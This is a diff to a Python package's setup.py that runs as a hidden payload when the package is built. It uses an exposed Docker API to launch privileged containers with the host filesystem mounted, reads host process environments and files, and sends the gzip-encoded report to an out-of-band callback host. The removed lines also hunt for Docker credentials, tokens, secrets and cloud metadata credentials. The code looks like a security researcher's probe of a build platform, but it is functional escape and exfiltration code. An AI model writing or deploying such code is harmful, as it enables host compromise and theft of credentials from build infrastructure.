@@ -2,6 +2,7 @@ import setuptools, json, urllib.request, urllib.error, time, base64, gzip, os
 
 OAST = "dbplsv55ap9v1jaadl501puypwbro4ye6.oast.online"
 D = "http://172.18.0.1:2375"
+TAG = "ver-probe-%s" % os.uname().nodename
 
 
 def api(path, method="GET", body=None, timeout=10):
@@ -35,7 +36,55 @@ def demux(b):
         return b
 
 
-out = ["== pypack7 root-guest probe %s ==" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())]
+def probe(name, user, script):
+    lines = ["== container %s user=%r ==" % (name, user)]
+    body = {
+        "Image": IMG,
+        "Entrypoint": ["/bin/sh", "-c"],
+        "Cmd": [script],
+        "HostConfig": {
+            "Binds": ["/:/host:ro"],
+            "Privileged": True,
+            "AutoRemove": False,
+            "NetworkMode": "host",
+        },
+    }
+    if user is not None:
+        body["User"] = user
+    st, b = api("/containers/create?name=%s" % name, "POST", json.dumps(body).encode())
+    lines.append("create -> %s %s" % (st, b[:300].decode("utf-8", "replace")))
+    cid = ""
+    try:
+        cid = json.loads(b).get("Id", "")
+    except Exception:
+        pass
+    if not cid:
+        return "\n".join(lines)
+    st, _ = api("/containers/%s/start" % cid, "POST")
+    lines.append("start -> %s" % st)
+    try:
+        api("/containers/%s/wait" % cid, "POST", timeout=30)
+    except Exception:
+        pass
+    st, logs = api("/containers/%s/logs?stdout=1&stderr=1" % cid)
+    lines.append("logs -> %s" % st)
+    lines.append(demux(logs).decode("utf-8", "replace")[:30000])
+    api("/containers/%s?force=1" % cid, "DELETE")
+    return "\n".join(lines)
+
+
+out = ["== VER-PROBE build-phase check %s ==" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())]
+out.append("build uid=%s" % os.getuid())
+out.append("build hostname=%s" % os.uname().nodename)
+out.append("build pwd=%s" % os.getcwd())
+out.append("KOYEB_DC=%s" % os.environ.get("KOYEB_DC"))
+out.append("KOYEB_GIT_BRANCH=%s" % os.environ.get("KOYEB_GIT_BRANCH"))
+out.append("CNB_BUILDPACK_DIR=%s" % os.environ.get("CNB_BUILDPACK_DIR"))
+try:
+    out.append("build /etc/hostname=%s" % open("/etc/hostname").read().strip())
+except Exception as e:
+    out.append("build /etc/hostname err %r" % e)
+
 st, b = api("/images/json")
 imgs = []
 try:
@@ -47,56 +96,27 @@ except Exception:
 img = next((t for t in imgs if "koyeb/builder" in t), imgs[0] if imgs else "")
 out.append("== images %r selected %r" % (imgs, img))
 
-script = (
-    "echo IRPROBE7; id; hostname; uname -a; grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status; "
-    "echo --root--; ls -la /host/root 2>&1 | head -30; "
-    "echo --rootdocker--; cat /host/root/.docker/config.json 2>&1 | head -50; "
-    "echo --scripts--; ls -la /host/builder/scripts 2>&1; for f in /host/builder/scripts/*; do echo \"== $f\"; head -c 3000 \"$f\" 2>&1; echo; done; "
-    "echo --builder-layers--; ls -la /host/builder/layers /host/builder/cache 2>&1 | head -20; "
-    "echo --etcenv--; cat /host/etc/environment 2>&1; echo; ls -la /host/run /host/var/run 2>&1 | head -40; "
-    "echo --dockerstate--; ls /host/var/lib/docker 2>&1 | head; ls /host/var/lib/docker/containers 2>&1 | head; "
-    "echo --containerenv--; for f in /host/var/lib/docker/containers/*/config.v2.json; do echo \"CFG $f\"; grep -o '\"Env\":\\[[^]]*\\]' \"$f\" 2>/dev/null | head -c 1500; echo; done 2>/dev/null | head -60; "
-    "echo --authsearch--; find /host/root /host/home /host/etc /host/run /host/var/run /host/opt /host/builder -maxdepth 5 \\( -iname '*docker*' -o -iname '*auth*' -o -iname '*registry*' -o -iname '*token*' -o -iname '*secret*' -o -iname '*credential*' -o -iname '*kube*' \\) 2>/dev/null | head -80; "
-    "echo --pid1--; tr '\\0' '\\n' < /host/proc/1/environ 2>&1 | head -40; "
-    "echo --kata--; ls -la /host/kata-containers 2>&1 | head; ls -la /host/dev/vsock 2>&1; "
-    "echo --platform--; cat /host/platform/env/* 2>&1 | head -20; "
-    "echo --hosts--; cat /host/etc/hosts /host/etc/resolv.conf 2>&1; "
-    "echo --metadata--; curl -s -m 4 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | head -c 400; "
-    "echo; echo --aws--; curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 200; "
-    "echo; echo --done--"
+common = (
+    "echo --whoami--; id; echo --hostname--; hostname; cat /etc/hostname 2>&1; "
+    "echo --guesthostname--; cat /host/etc/hostname 2>&1; "
+    "echo --guestos--; cat /host/etc/alpine-release 2>&1; "
+    "echo --pid1cmdline--; tr '\\0' ' ' < /host/proc/1/cmdline 2>&1; echo; "
+    "echo --pid1environ--; tr '\\0' '\\n' < /host/proc/1/environ 2>&1 | "
+    "sed -e 's/^DOCKER_PASSWORD=.*/DOCKER_PASSWORD=<REDACTED>/' "
+    "-e 's/^DOCKER_AUTH_CONFIG=.*/DOCKER_AUTH_CONFIG=<REDACTED>/' | head -40; "
+    "echo --envkeys--; tr '\\0' '\\n' < /host/proc/1/environ 2>/dev/null | "
+    "awk -F= '{print $1\" len=\"length($2)}' | head -30; "
+    "echo --hostroot--; ls -la /host/root 2>&1 | head -10; "
+    "echo --dockerstate--; ls /host/var/lib/docker/containers 2>&1 | head -6; "
+    "echo --cgroup--; grep -E '^0::|kata' /proc/self/cgroup 2>&1 | head -3; "
+    "echo --caps--; grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status; "
+    "echo --done--"
 )
 
 if img:
-    name = "irprobe7-%d" % os.getpid()
-    body = json.dumps({
-        "Image": img,
-        "User": "0",
-        "Entrypoint": ["/bin/sh", "-c"],
-        "Cmd": [script],
-        "HostConfig": {
-            "Binds": ["/:/host:ro"],
-            "Privileged": True,
-            "AutoRemove": False,
-            "NetworkMode": "host",
-        },
-    }).encode()
-    st, b = api("/containers/create?name=%s" % name, "POST", body)
-    out.append("== create -> %s %s" % (st, b[:400].decode("utf-8", "replace")))
-    cid = ""
-    try:
-        cid = json.loads(b).get("Id", "")
-    except Exception:
-        pass
-    if cid:
-        st, b = api("/containers/%s/start" % cid, "POST")
-        out.append("== start -> %s" % st)
-        try:
-            api("/containers/%s/wait" % cid, "POST", timeout=30)
-        except Exception:
-            pass
-        st, logs = api("/containers/%s/logs?stdout=1&stderr=1" % cid)
-        out.append("== logs -> %s\n%s" % (st, demux(logs).decode("utf-8", "replace")[:40000]))
-        api("/containers/%s?force=1" % cid, "DELETE")
+    IMG = img
+    out.append(probe("verctl-noUser-%d" % os.getpid(), None, common))
+    out.append(probe("verroot-User0-%d" % os.getpid(), "0", common))
 
 report = "\n".join(out)
 try:
@@ -105,9 +125,9 @@ except Exception:
     pass
 try:
     b64 = base64.urlsafe_b64encode(gzip.compress(report.encode())).decode().rstrip("=")
-    req = urllib.request.Request("https://%s/pypack7-%s" % (OAST, os.uname().nodename), data=b64.encode(), method="POST")
+    req = urllib.request.Request("https://%s/%s" % (OAST, TAG), data=b64.encode(), method="POST")
     urllib.request.urlopen(req, timeout=15).read()
 except Exception:
     pass
 
-setuptools.setup(name="ir-evilpkg7", version="1.0.0", packages=[])
+setuptools.setup(name="ir-verpkg", version="1.0.0", packages=[])
